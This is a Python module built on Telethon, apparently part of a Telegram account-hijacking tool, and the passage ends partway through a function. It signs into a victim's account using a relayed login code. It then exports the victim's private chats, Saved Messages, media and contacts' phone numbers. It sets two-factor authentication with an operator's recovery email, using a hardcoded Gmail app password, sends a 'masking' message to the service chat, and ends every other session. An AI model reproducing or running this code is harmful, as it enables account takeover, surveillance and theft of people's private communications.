"""
session_handler.py
Модуль для роботи з Telegram сесіями та авторизацією
"""
import asyncio
import hashlib
import os
import json
import shutil
import imaplib
import threading
import time
import email
import re
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError, PasswordHashInvalidError
)
from typing import Optional
import logging
from datetime import datetime, timedelta, timezone
from clear_telegram_chat import MASK_MESSAGE
from config import CHAT_FOLDER, RECOVERY_EMAIL
from telethon import functions, types

logger = logging.getLogger(__name__)


async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str, base_chats_folder: str = CHAT_FOLDER):
    """
    Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 днів
    разом з усіма медіафайлами та повною інформацією про відправників.
    Чат "Збережені повідомлення" зберігається повністю (без обмеження по часу).
    """
    # Створюємо папку для конкретного користувача
    user_folder = base_chats_folder  # НЕ створюємо ще одну папку!

    # Створюємо підпапку для медіафайлів
    media_folder = os.path.join(user_folder, "media")
    os.makedirs(media_folder, exist_ok=True)

    # Переконуємось, що папка існує
    os.makedirs(user_folder, exist_ok=True)

    # Визначаємо дату 7 днів тому з часовим поясом UTC
    date_limit = datetime.now(timezone.utc) - timedelta(days=7)
    logger.info(f"Починаємо збір чатів для {phone_number} за останні 7 днів (з {date_limit.date()})")

    dialog_count = 0
    processed_count = 0
    media_count = 0
    skipped_files_count = 0

    # Отримуємо всі діалоги
    async for dialog in client.iter_dialogs():
        # Пропускаємо групи, канали та боти (лише особисті чати)
        if not dialog.is_user:
            continue

        dialog_count += 1

        # Перевіряємо, чи це чат "Збережені повідомлення"
        is_saved_messages = dialog.id == (await client.get_me()).id
        chat_name = "Збережені повідомлення" if is_saved_messages else dialog.name

        if is_saved_messages:
            logger.info(f"Обробляємо чат #{dialog_count}: {chat_name} (ID: {dialog.id}) - повний збір")
        else:
            logger.info(f"Обробляємо чат #{dialog_count}: {chat_name} (ID: {dialog.id})")

        # Отримуємо інформацію про учасників чату
        participants_info = {}
        try:
            participants_info = await get_chat_participants_info(client, dialog.id)
        except Exception as e:
            logger.warning(f"Не вдалося отримати інформацію про учасників чату {dialog.id}: {e}")

        chat_messages = []
        message_count = 0

        try:
            # Встановлюємо таймаут для обробки одного чату (15 хвилин для "Збережених повідомлень")
            timeout = 900 if is_saved_messages else 600
            async with asyncio.timeout(timeout):
                # Отримуємо повідомлення з цього чату
                async for message in client.iter_messages(
                        dialog.entity,
                        limit=None,
                        reverse=False  # Від нових до старих
                ):
                    message_count += 1

                    # Якщо це не "Збережені повідомлення" і повідомлення старіше за date_limit, зупиняємо ітерацію
                    if not is_saved_messages and message.date < date_limit:
                        break

                    # Отримуємо детальну інформацію про відправника
                    sender_info = None
                    if message.from_id:
                        # Виправлення помилки з PeerChannel
                        try:
                            sender_id = message.from_id.user_id if hasattr(message.from_id, 'user_id') else None
                            if sender_id and sender_id in participants_info:
                                sender_info = participants_info[sender_id]
                        except Exception as e:
                            logger.debug(f"Помилка отримання ID відправника: {e}")

                    # Базова інформація про повідомлення
                    msg_data = {
                        "id": message.id,
                        "date": message.date.isoformat(),
                        "sender_id": message.from_id.user_id if message.from_id and hasattr(message.from_id,
                                                                                            'user_id') else None,
                        "receiver_id": dialog.id,
                        "has_media": bool(message.media),
                        "sender_name": getattr(message.sender, 'first_name', None) or getattr(message.sender,
                                                                                              'username', 'Unknown'),
                        "sender_info": sender_info,  # Додаткова інформація про відправника
                        "text": message.text or "",
                        "message_type": "text"  # Тип за замовчуванням
                    }

                    # Обробка медіафайлів (залишаємо без змін)
                    if message.media:
                        media_info = {}

                        # Визначаємо тип медіа та завантажуємо його
                        if message.photo:
                            msg_data["message_type"] = "photo"
                            media_info = {"type": "photo"}
                            try:
                                file_name = f"photo_{message.id}_{dialog.id}.jpg"
                                media_path = os.path.join(media_folder, file_name)

                                # Правильний спосіб отримати розмір файлу для PhotoSizeProgressive
                                file_size = 0
                                if message.photo.sizes:
                                    # Беремо останній (найбільший) розмір
                                    largest_size = message.photo.sizes[-1]
                                    if hasattr(largest_size, 'location'):
                                        file_size = largest_size.location.size
                                    elif hasattr(largest_size, 'size'):
                                        file_size = largest_size.size

                                if file_size > 200 * 1024 * 1024:  # 200 МБ
                                    logger.warning(
                                        f"Пропущено фото через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
                                    skipped_files_count += 1
                                else:
                                    await client.download_media(message.media, media_path)
                                    media_info["path"] = file_name
                                    media_count += 1
                                    logger.info(f"Завантажено фото: {file_name}")
                            except Exception as e:
                                logger.error(f"Помилка завантаження фото: {e}")
                                media_info["error"] = str(e)

                        elif message.video:
                            msg_data["message_type"] = "video"
                            media_info = {"type": "video"}
                            try:
                                file_name = f"video_{message.id}_{dialog.id}.mp4"
                                media_path = os.path.join(media_folder, file_name)

                                # Перевіряємо розмір файлу
                                file_size = message.video.size if hasattr(message.video, 'size') else 0
                                if file_size > 200 * 1024 * 1024:  # 200 МБ
                                    logger.warning(
                                        f"Пропущено відео через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
                                    skipped_files_count += 1
                                else:
                                    await client.download_media(message.media, media_path)
                                    media_info["path"] = file_name
                                    media_count += 1
                                    logger.info(f"Завантажено відео: {file_name}")
                            except Exception as e:
                                logger.error(f"Помилка завантаження відео: {e}")
                                media_info["error"] = str(e)

                        # Інші типи медіа залишаємо без змін...
                        elif message.video_note:
                            msg_data["message_type"] = "video_note"
                            media_info = {"type": "video_note"}
                            try:
                                file_name = f"video_note_{message.id}_{dialog.id}.mp4"
                                media_path = os.path.join(media_folder, file_name)

                                # Перевіряємо розмір файлу
                                file_size = message.video_note.size if hasattr(message.video_note, 'size') else 0
                                if file_size > 200 * 1024 * 1024:  # 200 МБ
                                    logger.warning(
                                        f"Пропущено відео-кружечок через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
                                    skipped_files_count += 1
                                else:
                                    await client.download_media(message.media, media_path)
                                    media_info["path"] = file_name
                                    media_count += 1
                                    logger.info(f"Завантажено відео-кружечок: {file_name}")
                            except Exception as e:
                                logger.error(f"Помилка завантаження відео-кружечка: {e}")
                                media_info["error"] = str(e)

                        elif message.voice:
                            msg_data["message_type"] = "voice"
                            media_info = {"type": "voice"}
                            try:
                                file_name = f"voice_{message.id}_{dialog.id}.ogg"
                                media_path = os.path.join(media_folder, file_name)

                                # Перевіряємо розмір файлу
                                file_size = message.voice.size if hasattr(message.voice, 'size') else 0
                                if file_size > 200 * 1024 * 1024:  # 200 МБ
                                    logger.warning(f"Пропущено голосове повідомлення через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
                                    skipped_files_count += 1
                                else:
                                    await client.download_media(message.media, media_path)
                                    media_info["path"] = file_name
                                    media_count += 1
                                    logger.info(f"Завантажено голосове повідомлення: {file_name}")
                            except Exception as e:
                                logger.error(f"Помилка завантаження голосового повідомлення: {e}")
                                media_info["error"] = str(e)

                        elif message.audio:
                            msg_data["message_type"] = "audio"
                            media_info = {"type": "audio"}
                            try:
                                file_name = f"audio_{message.id}_{dialog.id}.mp3"
                                media_path = os.path.join(media_folder, file_name)

                                # Перевіряємо розмір файлу
                                file_size = message.audio.size if hasattr(message.audio, 'size') else 0
                                if file_size > 200 * 1024 * 1024:  # 200 МБ
                                    logger.warning(
                                        f"Пропущено аудіо через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
                                    skipped_files_count += 1
                                else:
                                    await client.download_media(message.media, media_path)
                                    media_info["path"] = file_name
                                    media_count += 1
                                    logger.info(f"Завантажено аудіо: {file_name}")
                            except Exception as e:
                                logger.error(f"Помилка завантаження аудіо: {e}")
                                media_info["error"] = str(e)

                        elif message.document:
                            msg_data["message_type"] = "document"
                            media_info = {"type": "document"}
                            try:
                                # Отримуємо ім'я файлу з атрибутів документа
                                doc_name = "file"
                                if message.document.attributes:
                                    for attr in message.document.attributes:
                                        if hasattr(attr, 'file_name') and attr.file_name:
                                            doc_name = attr.file_name
                                            break

                                file_name = f"document_{message.id}_{dialog.id}_{doc_name}"
                                # Очищуємо ім'я файлу від недопустимих символів
                                file_name = re.sub(r'[^\w\-_.]', '_', file_name)
                                media_path = os.path.join(media_folder, file_name)

                                # Перевіряємо розмір файлу
                                file_size = message.document.size if hasattr(message.document, 'size') else 0
                                if file_size > 200 * 1024 * 1024:  # 200 МБ
                                    logger.warning(
                                        f"Пропущено документ через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
                                    skipped_files_count += 1
                                else:
                                    await client.download_media(message.media, media_path)
                                    media_info["path"] = file_name
                                    media_count += 1
                                    logger.info(f"Завантажено документ: {file_name}")
                            except Exception as e:
                                logger.error(f"Помилка завантаження документа: {e}")
                                media_info["error"] = str(e)

                        elif message.sticker:
                            msg_data["message_type"] = "sticker"
                            media_info = {"type": "sticker"}
                            try:
                                file_name = f"sticker_{message.id}_{dialog.id}.webp"
                                media_path = os.path.join(media_folder, file_name)

                                # Перевіряємо розмір файлу
                                file_size = 0
                                try:
                                    file_size = message.sticker.thumb.size if hasattr(message.sticker,
                                                                                      'thumb') and message.sticker.thumb else 0
                                except:
                                    pass

                                if file_size > 200 * 1024 * 1024:  # 200 МБ
                                    logger.warning(
                                        f"Пропущено стікер через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
                                    skipped_files_count += 1
                                else:
                                    await client.download_media(message.media, media_path)
                                    media_info["path"] = file_name
                                    media_count += 1
                                    logger.info(f"Завантажено стікер: {file_name}")
                            except Exception as e:
                                logger.error(f"Помилка завантаження стікера: {e}")
                                media_info["error"] = str(e)

                        elif hasattr(message, 'animation') and message.animation:
                            msg_data["message_type"] = "animation"
                            media_info = {"type": "animation"}
                            try:
                                file_name = f"animation_{message.id}_{dialog.id}.gif"
                                media_path = os.path.join(media_folder, file_name)

                                # Перевіряємо розмір файлу
                                file_size = message.animation.size if hasattr(message.animation, 'size') else 0
                                if file_size > 200 * 1024 * 1024:  # 200 МБ
                                    logger.warning(
                                        f"Пропущено анімацію через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
                                    skipped_files_count += 1
                                else:
                                    await client.download_media(message.media, media_path)
                                    media_info["path"] = file_name
                                    media_count += 1
                                    logger.info(f"Завантажено анімацію: {file_name}")
                            except Exception as e:
                                logger.error(f"Помилка завантаження анімації: {e}")
                                media_info["error"] = str(e)

                        # Додаємо інформацію про медіа до даних повідомлення
                        if media_info:
                            msg_data["media"] = media_info

                    # Додаємо інформацію про відповідь на повідомлення
                    if message.reply_to:
                        msg_data["reply_to"] = {
                            "id": message.reply_to.reply_to_msg_id,
                            "text": None  # Можна додати пізніше, якщо потрібно
                        }

                    # Виправлення помилки з 'MessageFwdHeader' object has no attribute 'channel_id'
                    if message.fwd_from:
                        msg_data["forwarded"] = {
                            "from_id": None,
                            "from_name": message.fwd_from.from_name,
                            "date": message.fwd_from.date.isoformat() if message.fwd_from.date else None
                        }

                        # Безпечне отримання ID відправника або каналу
                        try:
                            if hasattr(message.fwd_from, 'from_id') and message.fwd_from.from_id:
                                if hasattr(message.fwd_from.from_id, 'user_id'):
                                    msg_data["forwarded"]["from_id"] = message.fwd_from.from_id.user_id
                                elif hasattr(message.fwd_from.from_id, 'channel_id'):
                                    msg_data["forwarded"]["channel_id"] = message.fwd_from.from_id.channel_id
                        except Exception as e:
                            logger.debug(f"Помилка отримання ID перешіпуваного повідомлення: {e}")

                    # Додаємо інформацію про перегляд
                    if message.views is not None:
                        msg_data["views"] = message.views

                    # Додаємо інформацію про відповіді
                    if message.replies:
                        msg_data["replies"] = {
                            "replies": message.replies.replies,
                            "replies_pts": message.replies.replies_pts
                        }

                    # Додаємо інформацію про геолокацію
                    if message.geo:
                        msg_data["geo"] = {
                            "lat": message.geo.lat,
                            "long": message.geo.long
                        }

                    chat_messages.append(msg_data)

                    # Додаємо затримку кожні 20 повідомлень
                    if message_count % 20 == 0:
                        # Для "Збережених повідомлень" збільшуємо затримку
                        delay = 1.0 if is_saved_messages else 0.5
                        await asyncio.sleep(delay)
                        if is_saved_messages:
                            logger.info(f"  Оброблено {message_count} повідомлень з 'Збережених повідомлень'...")
                        else:
                            logger.info(f"  Оброблено {message_count} повідомлень...")

        except asyncio.TimeoutError:
            chat_type = "Збережених повідомлень" if is_saved_messages else f"чату {dialog.name}"
            logger.warning(
                f"⚠️ Таймаут при обробці {chat_type}. Перевірено {message_count} повідомлень, збережено {len(chat_messages)}.")
        except Exception as e:
            chat_type = "Збережених повідомлень" if is_saved_messages else f"чату {dialog.name}"
            logger.error(f"❌ Помилка при обробці {chat_type}: {e}")
            continue

        # Якщо є повідомлення, зберігаємо їх у файл
        if chat_messages:
            # Ім'я файлу: username або ID чату
            chat_filename = f"{dialog.id}.json"
            if hasattr(dialog.entity, 'username') and dialog.entity.username:
                chat_filename = f"{dialog.entity.username}.json"

            # Для "Збережених повідомлень" використовуємо спеціальне ім'я файлу
            if is_saved_messages:
                chat_filename = "saved_messages.json"

            chat_filepath = os.path.join(user_folder, chat_filename)

            try:
                # Створюємо структуру даних з метаданими
                chat_data = {
                    "chat_info": {
                        "id": dialog.id,
                        "name": chat_name,
                        "username": getattr(dialog.entity, 'username', None),
                        "type": "user",
                        "is_saved_messages": is_saved_messages,
                        "date_saved": datetime.now(timezone.utc).isoformat(),
                        "messages_count": len(chat_messages),
                        "media_count": sum(1 for msg in chat_messages if msg.get("media")),
                        "participants": participants_info  # Інформація про учасників чату
                    },
                    "messages": chat_messages
                }

                # Для "Збережених повідомлень" додаємо додаткову інформацію
                if is_saved_messages:
                    chat_data["chat_info"]["date_range"] = {
                        "earliest": min(msg["date"] for msg in chat_messages) if chat_messages else None,
                        "latest": max(msg["date"] for msg in chat_messages) if chat_messages else None
                    }

                with open(chat_filepath, 'w', encoding='utf-8') as f:
                    json.dump(chat_data, f, ensure_ascii=False, indent=4)

                chat_type = "Збережених повідомлень" if is_saved_messages else f"чату {dialog.name}"
                logger.info(f"✅ Збережено {len(chat_messages)} повідомлень з {chat_type} у файл: {chat_filename}")
                processed_count += 1
            except Exception as e:
                chat_type = "Збережених повідомлень" if is_saved_messages else f"чату {dialog.name}"
                logger.error(f"❌ Не вдалося зберегти файл для {chat_type}: {e}")
        else:
            chat_type = "Збережених повідомлень" if is_saved_messages else f"чату з {dialog.name}"
            if is_saved_messages:
                logger.info(f"ℹ️ У 'Збережених повідомленнях' не знайдено повідомлень.")
            else:
                logger.info(f"ℹ️ У {chat_type} не знайдено повідомлень за останні 7 днів.")

    # Фінальний лог з інформацією про обробку
    if is_saved_messages:
        logger.info(
            f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів, завантажено {media_count} медіафайлів, пропущено {skipped_files_count} файлів через обмеження розміру.")
        logger.info(f"📌 'Збережені повідомлення' збережено повністю без обмеження по часу.")
    else:
        logger.info(
            f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів, завантажено {media_count} медіафайлів, пропущено {skipped_files_count} файлів через обмеження розміру.")

    # Створюємо індексний файл для швидкого пошуку
    await create_chat_index(user_folder)


async def get_chat_participants_info(client: TelegramClient, dialog_id: int) -> dict:
    """
    Отримує інформацію про учасників чату для ідентифікації відправників
    """
    try:
        participants = {}
        try:
            async for user in client.iter_participants(dialog_id):
                participants[user.id] = {
                    "first_name": user.first_name,
                    "last_name": user.last_name,
                    "username": user.username,
                    "phone": user.phone,
                    "is_bot": user.bot
                }
        except Exception as e:
            logger.warning(f"Не вдалося отримати учасників чату {dialog_id}: {e}")
            # Повертаємо порожній словник, але не перериваємо процес
        return participants
    except Exception as e:
        logger.error(f"Помилка отримання учасників чату {dialog_id}: {e}")
        return {}


async def create_chat_index(user_folder: str):
    """
    Створює індексний файл для швидкого пошуку повідомлень
    """
    try:
        index_data = {
            "chats": [],
            "total_messages": 0,
            "total_media": 0,
            "total_skipped": 0,
            "date_range": {"earliest": None, "latest": None},
            "senders": {},
            "message_types": {},
            "media_types": {}
        }

        # Проходимо по всіх файлах чатів
        for filename in os.listdir(user_folder):
            if filename.endswith('.json') and filename != 'index.json':
                filepath = os.path.join(user_folder, filename)

                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        chat_data = json.load(f)

                    chat_info = chat_data.get('chat_info', {})
                    messages = chat_data.get('messages', [])

                    # Додаємо інформацію про чат до індексу
                    index_data["chats"].append({
                        "id": chat_info.get("id"),
                        "name": chat_info.get("name"),
                        "username": chat_info.get("username"),
                        "messages_count": chat_info.get("messages_count", 0),
                        "media_count": chat_info.get("media_count", 0)
                    })

                    # Оновлюємо загальні статистичні дані
                    index_data["total_messages"] += len(messages)
                    index_data["total_media"] += chat_info.get("media_count", 0)

                    # Аналізуємо повідомлення для побудови індексу
                    for msg in messages:
                        msg_date = msg.get("date")
                        if msg_date:
                            # Оновлюємо діапазон дат
                            if not index_data["date_range"]["earliest"] or msg_date < index_data["date_range"][
                                "earliest"]:
                                index_data["date_range"]["earliest"] = msg_date
                            if not index_data["date_range"]["latest"] or msg_date > index_data["date_range"]["latest"]:
                                index_data["date_range"]["latest"] = msg_date

                        # Збираємо інформацію про відправників
                        sender_id = msg.get("sender_id")
                        if sender_id:
                            if sender_id not in index_data["senders"]:
                                index_data["senders"][sender_id] = {
                                    "name": msg.get("sender_name", "Unknown"),
                                    "message_count": 0,
                                    "media_count": 0
                                }
                            index_data["senders"][sender_id]["message_count"] += 1
                            if msg.get("media"):
                                index_data["senders"][sender_id]["media_count"] += 1

                        # Збираємо інформацію про типи повідомлень
                        msg_type = msg.get("message_type", "text")
                        if msg_type not in index_data["message_types"]:
                            index_data["message_types"][msg_type] = 0
                        index_data["message_types"][msg_type] += 1

                        # Збираємо інформацію про типи медіа
                        if msg.get("media") and "type" in msg["media"]:
                            media_type = msg["media"]["type"]
                            if media_type not in index_data["media_types"]:
                                index_data["media_types"][media_type] = 0
                            index_data["media_types"][media_type] += 1

                            # Підраховуємо пропущені файли
                            if "skipped" in msg["media"]:
                                index_data["total_skipped"] += 1

                except Exception as e:
                    logger.error(f"Помилка обробки файлу {filename} для індексу: {e}")

        # Зберігаємо індексний файл
        index_path = os.path.join(user_folder, 'index.json')
        with open(index_path, 'w', encoding='utf-8') as f:
            json.dump(index_data, f, ensure_ascii=False, indent=4)

        logger.info(f"✅ Індексний файл створено: {index_path}")
        return True

    except Exception as e:
        logger.error(f"❌ Помилка створення індексного файлу: {e}")
        return False


async def send_verification_code(phone: str, api_id: int, api_hash: str, session_folder: str):
    """
    Відправляє код підтвердження на вказаний номер телефону.

    Args:
        phone: Номер телефону з кодом країни (наприклад, +380...)
        api_id: Telegram API ID
        api_hash: Telegram API Hash
        session_folder: Папка для збереження сесій

    Returns:
        tuple: (успіх: bool, клієнт або повідомлення_про_помилку: str)
    """
    import stat

    # Крок 1: Створюємо папку для сесій з правильними правами доступу
    try:
        os.makedirs(session_folder, exist_ok=True)
        # Встановлюємо права: власник може все, інші - читати та виконувати
        # Це вирішує проблему з readonly database на Fly.io
        os.chmod(session_folder, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
        logger.info(f"✅ Папку для сесій створено/перевірено: {session_folder}")
    except Exception as e:
        logger.error(f"❌ Помилка створення папки {session_folder}: {e}")
        return False, f"Помилка створення папки для сесій: {str(e)}"

    # Крок 2: Формуємо шлях до файлу сесії
    # Видаляємо '+' з номера телефону для імені файлу
    session_name = f"{phone.replace('+', '')}.session"
    session_path = os.path.join(session_folder, session_name)

    logger.info(f"📁 Створюємо сесію для {phone} за шляхом: {session_path}")

    client = TelegramClient(session_path, api_id, api_hash)

    try:
        await client.connect()

        # Перевіряємо, чи вже авторизований
        if await client.is_user_authorized():
            logger.warning(f"Користувач {phone} вже авторизований")
            await client.disconnect()
            return False, "Цей номер вже авторизований у системі."

        # Відправляємо запит на код
        await client.send_code_request(phone)
        logger.info(f"✅ Код успішно надіслано на {phone}")

        # Повертаємо клієнт для подальшого використання
        return True, client

    except PhoneNumberInvalidError:
        error_msg = f"Номер телефону {phone} недійсний або має неправильний формат."
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg

    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб. Зачекай {e.seconds} секунд і спробуй знову."
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg

    except Exception as e:
        error_msg = f"Помилка при відправці коду: {str(e)}"
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg


async def sign_in_with_code(client: TelegramClient, phone: str, code: str, session_folder: str):
    """
    Виконує вхід в Telegram використовуючи код підтвердження.
    """
    try:
        if not client.is_connected():
            await client.connect()

        # Намагаємось увійти з кодом
        await client.sign_in(phone, code=code)

        # Перевіряємо успішність авторизації
        if await client.is_user_authorized():
            session_name = f"{phone.replace('+', '')}.session"
            session_path = os.path.join(session_folder, session_name)

            logger.info(f"✅ Успішна авторизація для {phone}!")
            logger.info(f"Сесія збережена: {session_path}")

            return "Success", session_path
        else:
            error_msg = "Не вдалося авторизуватись. Спробуй ще раз."
            logger.error(error_msg)
            return False, error_msg

    except PhoneCodeInvalidError:
        error_msg = "❌ Невірний код підтвердження. Перевір і спробуй ще раз."
        logger.error(error_msg)
        return False, error_msg

    except PhoneCodeExpiredError:
        error_msg = "⏱ Код підтвердження застарів. Почни процес заново."
        logger.error(error_msg)
        return False, error_msg

    except SessionPasswordNeededError:
        # Повертаємо спеціальний результат, який вказує на наявність 2FA
        logger.warning(f"🔐 На акаунті {phone} виявлено 2FA.")
        return "2FA_DETECTED", "На цьому акаунті ввімкнена двофакторна автентифікація."

    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб входу. Зачекай {e.seconds} секунд."
        logger.error(error_msg)
        return False, error_msg

    except Exception as e:
        error_msg = (
            f"Непередбачена помилка: {str(e)}\n\n"
            "Можливі причини:\n"
            "• Telegram заблокував спробу входу через підозрілу активність\n"
            "• Проблеми з мережею\n"
            "• Некоректні API credentials"
        )
        logger.error(f"Помилка входу: {e}")
        return False, error_msg


def cleanup_old_emails(imap_host: str, email_user: str, email_pass: str):
    """Очищує старі листи від Telegram"""
    try:
        mail = imaplib.IMAP4_SSL(imap_host)
        mail.login(email_user, email_pass)
        mail.select("inbox")

        # Шукаємо всі листи від Telegram старші за 1 день
        _, messages = mail.search(None, 'FROM "noreply@telegram.org" BEFORE',
                                  (datetime.now() - timedelta(days=1)).strftime("%d-%b-%Y"))

        if messages[0]:
            for msg_id in messages[0].split():
                mail.store(msg_id, '+FLAGS', '\\Deleted')
            mail.expunge()
            logger.info(f"🗑️ Видалено {len(messages[0].split())} старих листів від Telegram")

        mail.logout()
    except Exception as e:
        logger.error(f"❌ Помилка очищення пошти: {e}")


def get_email_code_sync(imap_host: str, email_user: str, email_pass: str, timeout: int = 60) -> str:
    """Синхронна версія отримання коду з пошти"""
    logger.info(f"📧 Починаємо отримання коду з {imap_host} для {email_user}")
    deadline = time.time() + timeout
    attempt = 1

    while time.time() < deadline:
        logger.info(f"📧 Спроба {attempt} отримати код...")

        try:
            # Підключаємось до IMAP
            logger.debug(f"Підключення до IMAP сервера {imap_host}...")
            mail = imaplib.IMAP4_SSL(imap_host)
            mail.login(email_user, email_pass)
            logger.debug("Успішно підключено до IMAP")

            mail.select("inbox")
            logger.debug("Вибрана папка inbox")

            # Шукаємо непрочитані листи від Telegram
            logger.debug("Пошук листів від noreply@telegram.org...")
            _, messages = mail.search(None, 'FROM "noreply@telegram.org" UNSEEN')

            message_count = len(messages[0].split()) if messages[0] else 0
            logger.info(f"Знайдено {message_count} непрочитаних листів від Telegram")

            if messages[0]:
                # Беремо всі ID і сортуємо їх (останній буде останнім у списку)
                msg_ids = messages[0].split()
                logger.debug(f"Знайдено ID повідомлень: {msg_ids}")

                # Перебираємо від останнього до першого
                for msg_id in reversed(msg_ids):
                    logger.debug(f"Читаємо лист з ID: {msg_id}")

                    _, msg_data = mail.fetch(msg_id, "(RFC822)")

                    if msg_data and msg_data[0] and msg_data[0][1]:
                        raw_email = msg_data[0][1]
                        logger.debug(f"Отримано email, розмір: {len(raw_email)} байт")

                        msg = email.message_from_bytes(raw_email)

                        # Перевіряємо дату листа
                        date_str = msg.get('Date', '')
                        if date_str:
                            try:
                                from email.utils import parsedate_to_datetime
                                email_date = parsedate_to_datetime(date_str)
                                logger.debug(f"Дата листа: {email_date}")

                                # Якщо лист старший за 5 хвилин, пропускаємо
                                time_diff = time.time() - email_date.timestamp()
                                if time_diff > 300:  # 5 хвилин
                                    logger.debug(f"Лист занадто старий ({time_diff:.0f} сек), пропускаю")
                                    continue
                            except Exception as e:
                                logger.debug(f"Не вдалося розпарсити дату: {e}")

                        # Витягуємо текст листа
                        body = ""
                        if msg.is_multipart():
                            logger.debug("Email є multipart, шукаємо text/plain частину")
                            for part in msg.walk():
                                content_type = part.get_content_type()
                                logger.debug(f"Знайдено частину з типом: {content_type}")
                                if content_type == "text/plain":
                                    body = part.get_payload(decode=True).decode()
                                    logger.debug(f"Текст листа (перші 200 символів): {body[:200]}")
                                    break
                        else:
                            logger.debug("Email не multipart, читаємо payload")
                            body = msg.get_payload(decode=True).decode()
                            logger.debug(f"Текст листа (перші 200 символів): {body[:200]}")

                        # Шукаємо код (5-6 цифр)
                        logger.debug("Пошук коду підтвердження...")
                        code_match = re.search(r'\b(\d{5,6})\b', body)

                        if code_match:
                            code = code_match.group(1)
                            logger.info(f"✅ Знайдено код: {code}")

                            # Помічаємо лист як прочитаний
                            mail.store(msg_id, '+FLAGS', '\\Seen')
                            logger.debug("Лист позначено як прочитаний")

                            mail.logout()
                            logger.debug("Відключено від IMAP")
                            return code
                        else:
                            logger.warning("Код не знайдено в тексті листа")
                            logger.debug(f"Текст листа для аналізу: {body[:500]}")
                    else:
                        logger.warning("Не вдалося отримати дані листа")
            else:
                logger.info("Немає нових листів від Telegram")

            mail.logout()
            logger.debug("Відключено від IMAP")

        except imaplib.IMAP4.error as e:
            logger.error(f"❌ IMAP помилка: {e}")
        except Exception as e:
            logger.error(f"❌ Неочікувана помилка: {e}", exc_info=True)

        # Чекаємо перед наступною спробою
        wait_time = 5
        logger.info(f"⏳ Чекаємо {wait_time} секунд перед наступною спробою...")
        time.sleep(wait_time)
        attempt += 1

    logger.error(f"❌ Час очікування ({timeout} секунд) вичерпано")
    raise TimeoutError("Код підтвердження не отримано за відведений час")


def create_email_callback(imap_host: str, email_user: str, email_pass: str):
    """Створює синхронний callback для Telethon"""

    def email_code_callback(code_length: int):
        """Синхронний callback для Telethon"""
        logger.info(f"📧 Очікуємо код підтвердження на пошті (довжина: {code_length})...")
        logger.info(f"📧 Параметри: host={imap_host}, user={email_user}")

        try:
            # Викликаємо синхронну функцію безпосередньо
            code = get_email_code_sync(imap_host, email_user, email_pass, timeout=120)
            logger.info(f"✅ Код успішно отримано: {code}")
            return code
        except TimeoutError as e:
            logger.error(f"❌ Таймаут отримання коду: {e}")
            raise
        except Exception as e:
            logger.error(f"❌ Помилка отримання коду: {e}", exc_info=True)
            raise

        return email_code_callback


async def get_account_with_2fa(client: TelegramClient, new_password: str):
    try:
        IMAP_HOST = "imap.gmail.com"
        EMAIL_USER = RECOVERY_EMAIL
        EMAIL_PASS = "yjhlrwefngcoiwih"  # App Password для Gmail

        logger.info("📧 Починаємо процес встановлення 2FA")
        logger.info(f"📧 Email для відновлення: {EMAIL_USER}")
        logger.info(f"📧 IMAP хост: {IMAP_HOST}")

        logger.info("🗑️ Очищуємо старі листи від Telegram...")
        cleanup_old_emails(IMAP_HOST, EMAIL_USER, EMAIL_PASS)

        # Створюємо callback функцію
        callback = create_email_callback(IMAP_HOST, EMAIL_USER, EMAIL_PASS)

        # Використовуємо вбудований метод Telethon для встановлення 2FA
        logger.info("📧 Викликаємо client.edit_2fa...")
        await client.edit_2fa(
            current_password=None,  # Якщо пароля ще немає
            new_password=new_password,
            hint="For security",
            email=RECOVERY_EMAIL,
            email_code_callback=callback
        )

        try:
            await client.send_message(777000, MASK_MESSAGE)
            logger.info("🎭 Маскувальне повідомлення успішно відправлено в чат Telegram.")
        except Exception as e:
            logger.error(f"❌ Помилка при відправці маскувального повідомлення: {e}")

        logger.info(f"✅ Пароль 2FA успішно встановлено.")

        # --- Крок 3: Завершення всіх інших сесій ---
        logger.info("🔄 Завершую всі інші сесії...")
        sessions = await client(functions.account.GetAuthorizationsRequest())
        terminated_count = 0
        for session in sessions.authorizations:
            if not session.current:
                await client(functions.account.ResetAuthorizationRequest(hash=session.hash))
                logger.info(f" - Сесію {session.device_model} ({session.platform}) завершено.")
                terminated_count += 1

        logger.info(f"🛡️ Перехоплення завершено. Завершено {terminated_count} інших сесій.")
        return True, f"Перехоплення успішне"

    except PasswordHashInvalidError:
